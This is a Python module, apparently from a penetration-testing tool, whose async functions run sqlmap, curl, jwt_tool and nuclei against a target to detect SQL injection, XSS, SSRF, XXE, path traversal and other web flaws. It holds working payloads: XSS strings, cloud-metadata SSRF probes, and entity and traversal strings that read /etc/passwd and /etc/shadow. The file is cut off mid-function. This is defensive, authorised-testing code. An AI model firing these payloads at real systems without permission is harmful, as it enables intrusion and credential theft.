"""Phase 3: Vulnerability Analysis tools — evidence-based validation.

Every tool returns an evidence chain with weighted signals. Confidence levels:
  CONFIRMED (weight >= 2.0): Exploit-grade proof, ready to report.
  FIRM      (weight >= 1.0): Strong indicators, worth reporting with caveats.
  TENTATIVE (weight <  1.0): Single signal, needs manual verification.
"""

from __future__ import annotations

from kambo.canary import make_arithmetic_canary
from kambo.docker_runner import get_runner
from kambo.metrics import get_metrics
from kambo.models import (
    Confidence,
    EvidenceChain,
    Phase,
    chain_rank,
    confidence_meets,
)
from kambo.parsers.generic_parser import parse_json_output
from kambo.scope import validate_scope
from kambo.validation import (
    HttpResponse,
    validate_cors,
    validate_csrf,
    validate_deserialization,
    validate_graphql,
    validate_idor,
    validate_jwt,
    validate_open_redirect,
    validate_path_traversal,
    validate_prototype_pollution,
    validate_rce,
    validate_sqli,
    validate_ssrf,
    validate_ssti,
    validate_subdomain_takeover,
    validate_xss,
    validate_xxe,
)

async def vuln_sqli(
    target: str,
    parameter: str = "",
    method: str = "GET",
    level: int = 3,
    risk: int = 2,
) -> dict:
    """SQL Injection detection with multi-signal validation.

    Args:
        target: URL with injectable parameter (e.g., http://target/page?id=1)
        parameter: Specific parameter to test (empty = auto-detect)
        method: HTTP method (GET/POST)
        level: sqlmap level (1-5)
        risk: sqlmap risk (1-3)

    Returns evidence chain with confidence level instead of binary vulnerable flag.
    """
    validate_scope(target)
    runner = get_runner()
    metrics = get_metrics()

    param_flag = f"-p {parameter}" if parameter else ""
    method_flag = f"--method={method}" if method != "GET" else ""
    cmd = (
        f"sqlmap -u '{target}' {param_flag} {method_flag} --batch "
        f"--level={level} --risk={risk} --dbs --threads=4 "
        f"--output-dir=/tmp/sqlmap 2>/dev/null | tail -120"
    )

    result = await runner.run(cmd, "vuln_sqli", target, Phase.VULN_ANALYSIS, timeout=180)
    metrics.record_run("vuln_sqli")

    chain = validate_sqli(result.raw_output)

    if chain.total_weight > 0:
        metrics.record_finding("vuln_sqli", chain.confidence, chain.total_weight)

    return {
        "target": target,
        "parameter": parameter or "auto-detect",
        "vulnerable": chain.total_weight >= 1.0,
        "confidence": chain.confidence.value,
        "evidence": chain.summary(),
        "raw": result.raw_output,
    }


async def vuln_xss(
    target: str,
    parameter: str = "",
) -> dict:
    """XSS detection with reflection analysis and context validation.

    Tests multiple payloads and validates that reflection occurs in an
    executable context (not HTML-encoded, not inside comments).

    Args:
        target: URL to test
        parameter: Specific parameter to test
    """
    validate_scope(target)
    runner = get_runner()
    metrics = get_metrics()

    url = target if target.startswith("http") else f"https://{target}"

    # Test multiple payloads — different contexts require different payloads
    payloads = [
        '<script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        "'-alert(1)-'",
        '<svg onload=alert(1)>',
    ]

    best_chain = EvidenceChain()

    for payload in payloads:
        # Use curl with full response to analyze context
        if parameter:
            cmd = f'curl -s -D - "{url}" -d "{parameter}={payload}" 2>/dev/null'
        else:
            # Try as query string
            sep = "&" if "?" in url else "?"
            cmd = f'curl -s -D - "{url}{sep}q={payload}" 2>/dev/null'

        result = await runner.run(cmd, "vuln_xss", target, Phase.VULN_ANALYSIS, timeout=30)
        # Split headers from body so WAF detection can check headers separately
        parts = result.raw_output.split("\r\n\r\n", 1)
        resp_headers = parts[0] if len(parts) > 1 else ""
        resp_body = parts[1] if len(parts) > 1 else result.raw_output
        chain = validate_xss(resp_body, payload, parameter or "q", response_headers=resp_headers)

        # Rank by effective confidence first, then weight — a gated TENTATIVE
        # chain with high weight must never outrank a genuine FIRM one (§6).
        if chain_rank(chain) > chain_rank(best_chain):
            best_chain = chain

        # Stop only once we have strong, un-gated evidence.
        if confidence_meets(best_chain.confidence, Confidence.FIRM):
            break

    metrics.record_run("vuln_xss")
    if best_chain.total_weight > 0:
        metrics.record_finding("vuln_xss", best_chain.confidence, best_chain.total_weight)

    return {
        "target": target,
        # Verdict honors the ceiling: a WAF-gated (curl-only) or non-executable
        # context reflection does not count as exploitable here.
        "vulnerable": confidence_meets(best_chain.confidence, Confidence.FIRM),
        "confidence": best_chain.confidence.value,
        "evidence": best_chain.summary(),
        "raw": result.raw_output[:3000],
    }


async def vuln_ssrf(
    target: str,
    parameter: str = "url",
    callback_url: str = "",
) -> dict:
    """SSRF testing with response content analysis.

    Tests internal targets and validates by analyzing response content,
    not just status codes. A 200 status alone is NOT evidence of SSRF.

    Args:
        target: URL with potential SSRF parameter
        parameter: Parameter name to inject into
        callback_url: Collaborator/interactsh URL for OOB detection
    """
    validate_scope(target)
    runner = get_runner()
    metrics = get_metrics()

    # First, get a baseline response for comparison
    baseline_cmd = f'curl -s -D - "{target}?{parameter}=https://example.com" 2>/dev/null'
    baseline_result = await runner.run(baseline_cmd, "vuln_ssrf_baseline", target, Phase.VULN_ANALYSIS, timeout=15)
    baseline = HttpResponse(status=200, body=baseline_result.raw_output)

    internal_targets = [
        ("http://169.254.169.254/latest/meta-data/", "AWS IMDS"),
        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure IMDS"),
        ("http://metadata.google.internal/computeMetadata/v1/", "GCP Metadata"),
        ("http://127.0.0.1:80", "Localhost HTTP"),
        ("http://127.0.0.1:22", "Localhost SSH"),
        ("http://[::1]", "IPv6 Localhost"),
        ("file:///etc/passwd", "Local file read"),
    ]

    results_list = []
    best_chain = EvidenceChain(baseline=baseline.to_dict())

    for internal_url, description in internal_targets:
        # Get full response including body for content analysis
        cmd = f'curl -s -D - "{target}?{parameter}={internal_url}" 2>/dev/null'
        result = await runner.run(cmd, "vuln_ssrf", target, Phase.VULN_ANALYSIS, timeout=15)

        # Extract status code from headers
        import re
        status_match = re.search(r"HTTP/\d\.?\d?\s+(\d{3})", result.raw_output)
        status = status_match.group(1) if status_match else "000"

        chain = validate_ssrf(internal_url, status, result.raw_output)

        results_list.append({
            "payload": internal_url,
            "description": description,
            "status_code": status,
            "confidence": chain.confidence.value,
            "evidence": chain.summary(),
        })

        if chain.total_weight > best_chain.total_weight:
            best_chain = chain

    # OOB callback test if URL provided. We can only *send* the probe here — this
    # single-shot tool cannot poll the collaborator. Per I3, confirmation
    # requires a received-and-correlated hit, so we add NO confirming weight;
    # instead we flag that external correlation is pending. Only once a hit is
    # observed should validate_ssrf be re-run with oob_hit=True to lift the cap.
    if callback_url:
        cmd = f'curl -s "{target}?{parameter}={callback_url}" 2>/dev/null'
        await runner.run(cmd, "vuln_ssrf_oob", target, Phase.VULN_ANALYSIS, timeout=15)
        best_chain = best_chain.add_flag("oob-correlation-pending")
        best_chain = best_chain.add_fp_check(
            f"OOB probe sent to {callback_url} — poll the collaborator; a received "
            "hit confirms SSRF (I3), no hit means no SSRF"
        )

    metrics.record_run("vuln_ssrf")
    if best_chain.total_weight > 0:
        metrics.record_finding("vuln_ssrf", best_chain.confidence, best_chain.total_weight)

    return {
        "target": target,
        # Verdict honors the ceiling: without an OOB hit, SSRF stays TENTATIVE
        # (I3) no matter how many body keywords matched.
        "vulnerable": confidence_meets(best_chain.confidence, Confidence.FIRM),
        "parameter": parameter,
        "confidence": best_chain.confidence.value,
        "evidence": best_chain.summary(),
        "results": results_list,
    }


async def vuln_jwt(
    target: str,
    token: str,
) -> dict:
    """JWT token analysis with structured vulnerability checks.

    Tests for: weak signing secrets, algorithm confusion, missing claims.

    Args:
        target: Target application URL (for context)
        token: JWT token to analyze
    """
    validate_scope(target)
    runner = get_runner()
    metrics = get_metrics()

    # Analyze token structure
    cmd = f"jwt_tool '{token}' 2>/dev/null"
    result = await runner.run(cmd, "vuln_jwt_analyze", target, Phase.VULN_ANALYSIS, timeout=30)

    # Try weak secrets with wordlist, then common passwords
    cmd2 = (
        f"jwt_tool '{token}' -C -d /wordlists/jwt-secrets.txt 2>/dev/null || "
        f"jwt_tool '{token}' -C -p 'secret' -p 'password' -p '123456' "
        f"-p 'admin' -p 'key' -p 'jwt_secret' 2>/dev/null"
    )
    result2 = await runner.run(cmd2, "vuln_jwt_crack", target, Phase.VULN_ANALYSIS, timeout=60)

    chain = validate_jwt(result.raw_output, result2.raw_output)

    metrics.record_run("vuln_jwt")
    if chain.total_weight > 0:
        metrics.record_finding("vuln_jwt", chain.confidence, chain.total_weight)

    return {
        "target": target,
        "vulnerable": chain.total_weight >= 1.0,
        "confidence": chain.confidence.value,
        "evidence": chain.summary(),
        "analysis": result.raw_output[:2000],
        "crack_output": result2.raw_output[:1000],
    }


async def vuln_cors(target: str) -> dict:
    """CORS misconfiguration testing with proper policy analysis.

    Tests multiple origin variations and validates that reflected origins
    are actually exploitable (credentials must be allowed for real impact).

    Args:
        target: URL to test CORS headers
    """
    validate_scope(target)
    runner = get_runner()
    metrics = get_metrics()

    url = target if target.startswith("http") else f"https://{target}"

    # Extract domain for subdomain-based tests
    import re
    domain_match = re.search(r"https?://([^/]+)", url)
    domain = domain_match.group(1) if domain_match else target

    origins_to_test = [
        ("https://evil.com", "arbitrary origin"),
        ("null", "null origin (sandboxed iframe)"),
        (f"https://{domain}.evil.com", "subdomain suffix confusion"),
        (f"https://evil-{domain}", "prefix confusion"),
    ]

    best_chain = EvidenceChain()
    results_list = []

    for origin, description in origins_to_test:
        # Get full headers to analyze ACAO + ACAC together
        cmd = f'curl -s -I -H "Origin: {origin}" {url} 2>/dev/null'
        result = await runner.run(cmd, "vuln_cors", target, Phase.VULN_ANALYSIS, timeout=15)

        chain = validate_cors(origin, result.raw_output, domain)

        results_list.append({
            "origin": origin,
            "description": description,
            "headers": result.raw_output.strip()[:500],
            "confidence": chain.confidence.value,
            "evidence": chain.summary(),
        })

        if chain.total_weight > best_chain.total_weight:
            best_chain = chain

    metrics.record_run("vuln_cors")
    if best_chain.total_weight > 0:
        metrics.record_finding("vuln_cors", best_chain.confidence, best_chain.total_weight)

    return {
        "target": target,
        "misconfigured": best_chain.total_weight >= 1.0,
        "confidence": best_chain.confidence.value,
        "evidence": best_chain.summary(),
        "results": results_list,
    }


async def vuln_idor(
    target: str,
    token: str,
    id_range: tuple[int, int] = (1, 20),
) -> dict:
    """IDOR/BOLA testing with baseline comparison and response diffing.

    Instead of just counting 200 responses, compares response bodies to detect
    whether different IDs return genuinely different user data vs. generic responses.

    Args:
        target: API endpoint with ID parameter (e.g., /api/users/{id})
        token: Authorization token
        id_range: Range of IDs to test (start, end)
    """
    validate_scope(target)
    runner = get_runner()
    metrics = get_metrics()

    start, end = id_range

    # Step 1: Get baseline — what does an invalid/non-existent ID return?
    baseline_cmd = (
        f'curl -s -D - -H "Authorization: Bearer {token}" '
        f'"{target}/999999999" 2>/dev/null'
    )
    baseline_result = await runner.run(baseline_cmd, "vuln_idor_baseline", target, Phase.VULN_ANALYSIS, timeout=15)

    import re
    status_match = re.search(r"HTTP/\d\.?\d?\s+(\d{3})", baseline_result.raw_output)
    baseline_status = int(status_match.group(1)) if status_match else 0
    # Split headers from body
    parts = baseline_result.raw_output.split("\r\n\r\n", 1)
    baseline_body = parts[1] if len(parts) > 1 else baseline_result.raw_output
    baseline = HttpResponse(status=baseline_status, body=baseline_body)

    # Step 2: Test each ID and capture full responses
    test_responses: list[tuple[str, HttpResponse]] = []
    for i in range(start, min(end + 1, start + 20)):  # cap at 20 to be respectful
        cmd = (
            f'curl -s -D - -H "Authorization: Bearer {token}" '
            f'"{target}/{i}" 2>/dev/null'
        )
        result = await runner.run(cmd, "vuln_idor", target, Phase.VULN_ANALYSIS, timeout=10)

        s_match = re.search(r"HTTP/\d\.?\d?\s+(\d{3})", result.raw_output)
        resp_status = int(s_match.group(1)) if s_match else 0
        resp_parts = result.raw_output.split("\r\n\r\n", 1)
        resp_body = resp_parts[1] if len(resp_parts) > 1 else result.raw_output

        test_responses.append((str(i), HttpResponse(status=resp_status, body=resp_body)))

    # Step 3: Validate with diffing
    chain = validate_idor(baseline, test_responses)

    accessible = [rid for rid, resp in test_responses if resp.status == 200]

    metrics.record_run("vuln_idor")
    if chain.total_weight > 0:
        metrics.record_finding("vuln_idor", chain.confidence, chain.total_weight)

    return {
        "target": target,
        "vulnerable": chain.total_weight >= 1.0,
        "confidence": chain.confidence.value,
        "evidence": chain.summary(),
        "accessible_ids": accessible,
        "total_accessible": len(accessible),
        "total_tested": min(end - start + 1, 20),
        "baseline_status": baseline_status,
    }


async def vuln_ssti(
    target: str,
    parameter: str = "",
    engine: str = "auto",
) -> dict:
    """Server-Side Template Injection detection.

    Uses an orthogonal arithmetic canary — {{31337*1337}}→41897569 (doctrine
    I2/P1). The product carries many distinct digits and cannot occur as organic
    page content, unlike the banned {{7*7}}→49. A baseline is captured so the
    render can be confirmed differentially (I1).
    Detects Jinja2, Twig, Smarty, Freemarker, Velocity, Pebble.

    Args:
        target: URL to test
        parameter: Parameter to inject into (empty = try all)
        engine: Template engine hint (auto, jinja2, twig, smarty, velocity)
    """
    validate_scope(target)
    runner = get_runner()
    metrics = get_metrics()

    url = target if target.startswith("http") else f"https://{target}"

    # Orthogonal canary shared across engines — only the delimiter syntax varies.
    canary = make_arithmetic_canary()
    expr, render = canary.expression, canary.expected_render

    # Engine-specific delimiters → same improbable render.
    payloads: list[tuple[str, str, str]] = [
        ("{{" + expr + "}}", render, "jinja2/twig"),
        ("${" + expr + "}", render, "freemarker/velocity"),
        ("<%= " + expr + " %>", render, "erb/ejs"),
        ("#{" + expr + "}", render, "ruby-interpolation"),
        ("{" + expr + "}", render, "smarty-math"),
    ]

    if engine != "auto":
        engine_map = {
            "jinja2": [("{{" + expr + "}}", render, "jinja2")],
            "twig": [("{{" + expr + "}}", render, "twig")],
            "smarty": [("{$smarty.version}", "", "smarty"), ("{" + expr + "}", render, "smarty-math")],
            "velocity": [("${" + expr + "}", render, "velocity")],
        }
        payloads = engine_map.get(engine, payloads)

    # Get baseline first
    cmd_baseline = f'curl -s -m 15 "{url}" 2>/dev/null'
    baseline_result = await runner.run(cmd_baseline, "vuln_ssti_baseline", target, Phase.VULN_ANALYSIS, timeout=20)
    baseline_body = baseline_result.raw_output

    chain = EvidenceChain().set_baseline({"body_length": len(baseline_body)})

    results: list[dict] = []
    for payload, expected, engine_name in payloads:
        import urllib.parse
        encoded = urllib.parse.quote(payload)
        test_url = f"{url}{'&' if '?' in url else '?'}{parameter}={encoded}" if parameter else f"{url}?q={encoded}"
        cmd = f'curl -s -m 15 "{test_url}" 2>/dev/null'
        result = await runner.run(cmd, "vuln_ssti", target, Phase.VULN_ANALYSIS, timeout=20)

        ssti_chain = validate_ssti(
            output=result.raw_output,
            payload=payload,
            expected_render=expected,
            baseline_body=baseline_body,
        )
        if ssti_chain.total_weight > 0:
            # Adopt the validator's chain wholesale — re-wrapping into a fresh
            # chain would silently drop the ceiling/gates it computed (I1/I2).
            chain = ssti_chain.set_baseline({"body_length": len(baseline_body)})
            results.append({
                "payload": payload,
                "expected": expected,
                "engine": engine_name,
                "confidence": ssti_chain.confidence.value,
                "evidence": ssti_chain.summary(),
            })
            break  # one confirmed SSTI is enough

    metrics.record_run("vuln_ssti")
    if chain.total_weight > 0:
        metrics.record_finding("vuln_ssti", chain.confidence, chain.total_weight)

    return {
        "target": target,
        "parameter": parameter,
        # Verdict honors the ceiling, not raw weight: a capped finding (no
        # differential, non-orthogonal marker) is not "vulnerable".
        "vulnerable": confidence_meets(chain.confidence, Confidence.FIRM),
        "confidence": chain.confidence.value,
        "evidence": chain.summary(),
        "ssti_results": results,
    }


async def vuln_nuclei_scan(
    target: str,
    templates: str = "cves,vulnerabilities",
    severity: str = "critical,high",
) -> dict:
    """Targeted Nuclei scan with confidence from template matchers.

    Nuclei's own matcher system provides evidence — we map its severity
    and matcher confidence to our evidence chain.

    Args:
        target: URL to scan
        templates: Template categories (comma-separated)
        severity: Severity filter
    """
    validate_scope(target)
    runner = get_runner()
    metrics = get_metrics()

    url = target if target.startswith("http") else f"https://{target}"
    template_flags = " ".join(f"-t {t}/" for t in templates.split(","))
    cmd = f"nuclei -u {url} {template_flags} -severity {severity} -json 2>/dev/null"

    result = await runner.run(cmd, "vuln_nuclei_scan", target, Phase.VULN_ANALYSIS, timeout=300)

    from kambo.parsers import parse_nuclei
    parsed = parse_nuclei(result.raw_output)

    # Build evidence from nuclei findings
    chain = EvidenceChain()
    for finding in parsed.get("findings", []):
        sev = finding.get("severity", "info")
        # Nuclei matchers are well-validated — weight by severity
        weight_map = {"critical": 1.5, "high": 1.0, "medium": 0.5, "low": 0.2, "info": 0.1}
        chain = chain.add(
            signal=f"Nuclei: {finding.get('template_id', 'unknown')} ({sev})",
            source="nuclei",
            raw_data=str(finding.get("matched_at", ""))[:500],
            weight=weight_map.get(sev, 0.1),
        )

    metrics.record_run("vuln_nuclei_scan")
    if chain.total_weight > 0:
        metrics.record_finding("vuln_nuclei_scan", chain.confidence, chain.total_weight)

    return {
        "target": target,
        "confidence": chain.confidence.value,
        "evidence": chain.summary(),
        **parsed,
    }


async def vuln_subdomain_takeover(target: str) -> dict:
    """Subdomain takeover detection with CNAME analysis and service fingerprinting.

    Goes beyond dangling CNAME detection — checks service-specific error pages
    to confirm the subdomain is actually claimable.

    Args:
        target: Domain to check for takeover
    """
    validate_scope(target)
    runner = get_runner()
    metrics = get_metrics()

    # Step 1: Check CNAME
    cmd = f"dig +short CNAME {target} 2>/dev/null"
    result = await runner.run(cmd, "vuln_subdomain_takeover", target, Phase.VULN_ANALYSIS, timeout=15)
    cname = result.raw_output.strip().rstrip(".")

    cname_resolves = False
    response_body = ""

    if cname:
        # Step 2: Check if CNAME target resolves
        cmd2 = f"dig +short {cname} 2>/dev/null"
        result2 = await runner.run(cmd2, "vuln_subdomain_takeover_resolve", target, Phase.VULN_ANALYSIS, timeout=15)
        cname_resolves = bool(result2.raw_output.strip())

        # Step 3: Fetch the page to check for service fingerprints
        cmd3 = f'curl -s -L -k "https://{target}" 2>/dev/null || curl -s -L -k "http://{target}" 2>/dev/null'
        result3 = await runner.run(cmd3, "vuln_subdomain_takeover_http", target, Phase.VULN_ANALYSIS, timeout=15)
        response_body = result3.raw_output

    chain = validate_subdomain_takeover(cname, cname_resolves, response_body)

    metrics.record_run("vuln_subdomain_takeover")
    if chain.total_weight > 0:
        metrics.record_finding("vuln_subdomain_takeover", chain.confidence, chain.total_weight)

    return {
        "target": target,
        "cname": cname,
        "cname_resolves": cname_resolves,
        "vulnerable": chain.total_weight >= 1.0,
        "confidence": chain.confidence.value,
        "evidence": chain.summary(),
    }


async def vuln_path_traversal(
    target: str,
    parameter: str = "file",
) -> dict:
    """Path traversal / Local File Inclusion detection with file content validation.

    Tests common traversal payloads and validates by matching known file content
    signatures (e.g., /etc/passwd, win.ini) — not just status codes.

    Args:
        target: URL with potential path traversal parameter
        parameter: Parameter name to inject traversal payloads into
    """
    validate_scope(target)
    runner = get_runner()
    metrics = get_metrics()

    url = target if target.startswith("http") else f"https://{target}"

    payloads = [
        ("../../../../etc/passwd", "linux_passwd"),
        ("../../../../etc/shadow", "linux_shadow"),
        ("../../../../windows/win.ini", "windows_ini"),
        ("....//....//....//etc/passwd", "double_dot_bypass"),
        ("%2e%2e%2f%2e%2e%2fetc%2fpasswd", "url_encoded"),
    ]

    baseline_cmd = f'curl -s "{url}?{parameter}=index.html" 2>/dev/null'
    baseline_result = await runner.run(baseline_cmd, "vuln_path_traversal_baseline", target, Phase.VULN_ANALYSIS, timeout=15)
    baseline_body = baseline_result.raw_output

    best_chain = EvidenceChain()
    results_list = []

    for payload, label in payloads:
        cmd = f'curl -s "{url}?{parameter}={payload}" 2>/dev/null'
        result = await runner.run(cmd, "vuln_path_traversal", target, Phase.VULN_ANALYSIS, timeout=15)
        chain = validate_path_traversal(result.raw_output, payload, baseline_body)

        results_list.append({
            "payload": payload,
            "label": label,
            "confidence": chain.confidence.value,
            "evidence": chain.summary(),
        })

        if chain_rank(chain) > chain_rank(best_chain):
            best_chain = chain

        if confidence_meets(best_chain.confidence, Confidence.FIRM):
            break

    metrics.record_run("vuln_path_traversal")
    if best_chain.total_weight > 0:
        metrics.record_finding("vuln_path_traversal", best_chain.confidence, best_chain.total_weight)

    return {
        "target": target,
        "parameter": parameter,
        "vulnerable": confidence_meets(best_chain.confidence, Confidence.FIRM),
        "confidence": best_chain.confidence.value,
        "evidence": best_chain.summary(),
        "results": results_list,
    }


async def vuln_xxe(
    target: str,
    parameter: str = "",
    callback_url: str = "",
) -> dict:
    """XML External Entity (XXE) Injection detection.

    Tests in-band file read payloads and optionally OOB via a collaborator URL.
    Validates response body for known file content signatures (doctrine I1/I3).

    Args:
        target: URL that accepts XML input
        parameter: POST body parameter name containing XML (empty = raw XML body)
        callback_url: OOB collaborator URL for blind XXE detection
    """
    validate_scope(target)
    runner = get_runner()
    metrics = get_metrics()

    url = target if target.startswith("http") else f"https://{target}"

    inband_payload = (
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"
        "<root>&xxe;</root>"
    )
    baseline_cmd = (
        f'curl -s -X POST -H "Content-Type: application/xml" '
        f'-d "<root>test</root>" "{url}" 2>/dev/null'
    )
    baseline_result = await runner.run(baseline_cmd, "vuln_xxe_baseline", target, Phase.VULN_ANALYSIS, timeout=15)
    baseline_body = baseline_result.raw_output

    cmd = (
        f'curl -s -X POST -H "Content-Type: application/xml" '
        f"-d '{inband_payload}' \"{url}\" 2>/dev/null"
    )
    result = await runner.run(cmd, "vuln_xxe", target, Phase.VULN_ANALYSIS, timeout=30)
    chain = validate_xxe(
        output=result.raw_output,
        payload=inband_payload,
        expected_content="root:x:0:0",
        baseline_body=baseline_body,
    )

    if callback_url:
        oob_payload = (
            f"<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'http://{callback_url}/xxe'>]>"
            "<root>&xxe;</root>"
        )
        oob_cmd = (
            f'curl -s -X POST -H "Content-Type: application/xml" '
            f"-d '{oob_payload}' \"{url}\" 2>/dev/null"
        )
        await runner.run(oob_cmd, "vuln_xxe_oob", target, Phase.VULN_ANALYSIS, timeout=15)
        chain = chain.add_fp_check(
            f"OOB probe sent to {callback_url} — poll the collaborator; "
            "a received hit confirms XXE (I3). Pass oob_hit=True to lift cap."
        )

    metrics.record_run("vuln_xxe")
    if chain.total_weight > 0:
        metrics.record_finding("vuln_xxe", chain.confidence, chain.total_weight)

    return {
        "target": target,
        "vulnerable": confidence_meets(chain.confidence, Confidence.FIRM),
        "confidence": chain.confidence.value,
        "evidence": chain.summary(),
        "raw": result.raw_output[:2000],
    }


async def vuln_csrf(
    target: str,
    endpoint: str = "",
    method: str = "POST",
    token: str = "",
) -> dict:
    """CSRF vulnerability assessment — checks for CSRF tokens, SameSite cookies, CORS.

    Fetches the page/form and inspects response headers for CSRF mitigations.
    Does NOT submit forms (passive analysis only unless state_change_confirmed manually).

    Args:
        target: Base URL of the target application
        endpoint: Specific endpoint/form to check (appended to target if given)
        method: HTTP method the form uses (GET/POST)
        token: Auth token to include in requests
    """
    validate_scope(target)
    runner = get_runner()
    metrics = get_metrics()

    url = target if target.startswith("http") else f"https://{target}"
    if endpoint:
        url = url.rstrip("/") + "/" + endpoint.lstrip("/")

    auth_header = f'-H "Authorization: Bearer {token}"' if token else ""
    cmd = f'curl -s -D - {auth_header} "{url}" 2>/dev/null'
    result = await runner.run(cmd, "vuln_csrf", target, Phase.VULN_ANALYSIS, timeout=15)

    output = result.raw_output
    import re

    # Parse headers/body
    parts = output.split("\r\n\r\n", 1)
    headers = parts[0] if len(parts) > 1 else output
    body = parts[1] if len(parts) > 1 else ""

    # Detect CSRF token in body or form
    has_csrf_token = bool(re.search(
        r'(csrf[_-]?token|_token|authenticity_token|csrfmiddlewaretoken)',
        body, re.IGNORECASE,
    ))

    # Parse SameSite from Set-Cookie
    samesite_match = re.search(r"SameSite=(\w+)", headers, re.IGNORECASE)
    samesite = samesite_match.group(1) if samesite_match else ""

    # Parse Content-Type
    ct_match = re.search(r"Content-Type:\s*([^\r\n]+)", headers, re.IGNORECASE)
    content_type = ct_match.group(1).strip() if ct_match else ""

    # Parse CORS
    cors_match = re.search(r"Access-Control-Allow-Origin:\s*([^\r\n]+)", headers, re.IGNORECASE)
    cors_origin = cors_match.group(1).strip() if cors_match else ""

    chain = validate_csrf(
        output=output,
        has_csrf_token=has_csrf_token,
        samesite_cookie=samesite,
        content_type=content_type,
        method=method,
        cors_origin=cors_origin,
    )

    metrics.record_run("vuln_csrf")
    if chain.total_weight > 0:
        metrics.record_finding("vuln_csrf", chain.confidence, chain.total_weight)

    return {
        "target": target,
        "endpoint": endpoint or "/",
        "has_csrf_token": has_csrf_token,
        "samesite_cookie": samesite,
        "cors_origin": cors_origin,
        "vulnerable": confidence_meets(chain.confidence, Confidence.FIRM),
        "confidence": chain.confidence.value,
        "evidence": chain.summary(),
    }


async def vuln_open_redirect(
    target: str,
    parameter: str = "url",
) -> dict:
    """Open Redirect detection — injects external URLs and follows redirects.

    Sends redirect payloads and checks whether the server issues a 3xx
    pointing to the injected domain. Uses curl -L to follow the chain.

    Args:
        target: URL with a redirect parameter
        parameter: Query/body parameter that controls the redirect destination
    """
    validate_scope(target)
    runner = get_runner()
    metrics = get_metrics()

    url = target if target.startswith("http") else f"https://{target}"
    sep = "&" if "?" in url else "?"

    redirect_targets = [
        "https://evil.com/",
        "//evil.com",
        "/\\evil.com",
    ]

    # Baseline: what does the redirect param look like without injection?
    baseline_cmd = f'curl -s -D - "{url}{sep}{parameter}=https://example.com" 2>/dev/null'
    baseline_result = await runner.run(baseline_cmd, "vuln_open_redirect_baseline", target, Phase.VULN_ANALYSIS, timeout=15)
    import re
    loc_match = re.search(r"Location:\s*([^\r\n]+)", baseline_result.raw_output, re.IGNORECASE)
    baseline_redirect = loc_match.group(1).strip() if loc_match else ""

    best_chain = EvidenceChain()
    results_list = []

    for redirect_url in redirect_targets:
        cmd = f'curl -s -D - -m 10 "{url}{sep}{parameter}={redirect_url}" 2>/dev/null'
        result = await runner.run(cmd, "vuln_open_redirect", target, Phase.VULN_ANALYSIS, timeout=15)

        status_match = re.search(r"HTTP/\d\.?\d?\s+(\d{3})", result.raw_output)
        status_code = int(status_match.group(1)) if status_match else 0
        loc2_match = re.search(r"Location:\s*([^\r\n]+)", result.raw_output, re.IGNORECASE)
        final_url = loc2_match.group(1).strip() if loc2_match else ""

        chain = validate_open_redirect(
            output=result.raw_output,
            redirect_url=redirect_url,
            final_url=final_url,
            status_code=status_code,
            baseline_redirect=baseline_redirect,
        )

        results_list.append({
            "payload": redirect_url,
            "status_code": status_code,
            "final_url": final_url,
            "confidence": chain.confidence.value,
            "evidence": chain.summary(),
        })

        if chain_rank(chain) > chain_rank(best_chain):
            best_chain = chain

        if confidence_meets(best_chain.confidence, Confidence.FIRM):
            break

    metrics.record_run("vuln_open_redirect")
    if best_chain.total_weight > 0:
        metrics.record_finding("vuln_open_redirect", best_chain.confidence, best_chain.total_weight)

    return {
        "target": target,
        "parameter": parameter,
        "vulnerable": confidence_meets(best_chain.confidence, Confidence.FIRM),
        "confidence": best_chain.confidence.value,
        "evidence": best_chain.summary(),
        "results": results_list,
    }


async def vuln_prototype_pollution(
    target: str,
    endpoint: str = "",
    token: str = "",
) -> dict:
    """Prototype Pollution detection via JSON body injection.

    Injects __proto__ and constructor.prototype keys into POST JSON bodies
    and checks whether the injected value propagates into the response.

    Args:
        target: Base URL of the target application
        endpoint: API endpoint to inject into (appended to target)
        token: Auth token for authenticated endpoints
    """
    validate_scope(target)
    runner = get_runner()
    metrics = get_metrics()

    url = target if target.startswith("http") else f"https://{target}"
    if endpoint:
        url = url.rstrip("/") + "/" + endpoint.lstrip("/")

    auth_header = f'-H "Authorization: Bearer {token}"' if token else ""
    injected_value = "kambo_pp_canary_31337"

    # Baseline: normal POST
    baseline_cmd = (
        f'curl -s -X POST -H "Content-Type: application/json" {auth_header} '
        f'-d \'{{"name": "test"}}\' "{url}" 2>/dev/null'
    )
    baseline_result = await runner.run(baseline_cmd, "vuln_pp_baseline", target, Phase.VULN_ANALYSIS, timeout=15)
    baseline_body = baseline_result.raw_output

    payloads = [
        f'{{"__proto__": {{"polluted": "{injected_value}"}}}}',
        f'{{"constructor": {{"prototype": {{"polluted": "{injected_value}"}}}}}}',
    ]

    best_chain = EvidenceChain()

    for payload in payloads:
        cmd = (
            f'curl -s -X POST -H "Content-Type: application/json" {auth_header} '
            f"-d '{payload}' \"{url}\" 2>/dev/null"
        )
        result = await runner.run(cmd, "vuln_prototype_pollution", target, Phase.VULN_ANALYSIS, timeout=15)
        chain = validate_prototype_pollution(
            output=result.raw_output,
            payload=payload,
            injected_value=injected_value,
            baseline_body=baseline_body,
        )

        if chain_rank(chain) > chain_rank(best_chain):
            best_chain = chain

        if confidence_meets(best_chain.confidence, Confidence.FIRM):
            break

    metrics.record_run("vuln_prototype_pollution")
    if best_chain.total_weight > 0:
        metrics.record_finding("vuln_prototype_pollution", best_chain.confidence, best_chain.total_weight)

    return {
        "target": target,
        "endpoint": endpoint or "/",
        "vulnerable": confidence_meets(best_chain.confidence, Confidence.FIRM),
        "confidence": best_chain.confidence.value,
        "evidence": best_chain.summary(),
    }


async def vuln_graphql(
    target: str,
    endpoint: str = "/graphql",
) -> dict:
    """GraphQL security assessment — introspection, error verbosity, injection.

    Three attack vectors:
    1. Introspection enabled (full schema leak)
    2. Verbose errors (field names and types leak from malformed queries)
    3. Injection via field arguments (SQL/NoSQL errors from injected chars)

    Args:
        target: Base URL of the application
        endpoint: GraphQL endpoint path (default: /graphql)
    """
    validate_scope(target)
    runner = get_runner()
    metrics = get_metrics()

    base = target if target.startswith("http") else f"https://{target}"
    url = base.rstrip("/") + "/" + endpoint.lstrip("/")

    # 1. Baseline
    baseline_cmd = (
        f'curl -s -X POST -H "Content-Type: application/json" '
